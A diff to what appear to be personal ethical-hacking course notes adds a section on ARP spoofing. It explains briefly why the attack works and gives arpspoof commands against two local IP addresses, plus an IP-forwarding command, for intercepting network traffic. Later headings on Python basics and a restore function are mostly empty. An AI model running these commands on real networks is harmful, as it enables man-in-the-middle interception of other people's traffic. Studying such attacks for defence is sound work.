@@ -345,4 +345,36 @@ LIST OF DICTIONARIES
 
 **What is ARP spoofing**
 
+Why ARP spoofing is possible:
+1. clients accept responses even if they did not send a request.
+2. client trust response without any form of verification.
 
+**Intercepting data in a network using arpspoof**
+
+```bash
+#kali linux
+arpspoof -i eth0 -t 10.0.3.10 10.0.3.250
+arpspoof -i eth0 -t 10.0.3.250 10.0.3.10
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+ 
+ **Creating an ARP response**
+
+ **Sending ARP responses**
+
+ **Extracting MAC address from response**
+
+ **Introduction to loops in Python**
+
+ [More on Python loops](https://www.tutorialspoint.com/python/python_loops.htm)
+
+ **Dynamic Printing**
+
+ **Exception handling in Python**
+
+ [More on Exceptions Handling](https://www.tutorialspoint.com/python/python_exceptions.htm)
+
+ **Implementing a restore function**
+
+ 
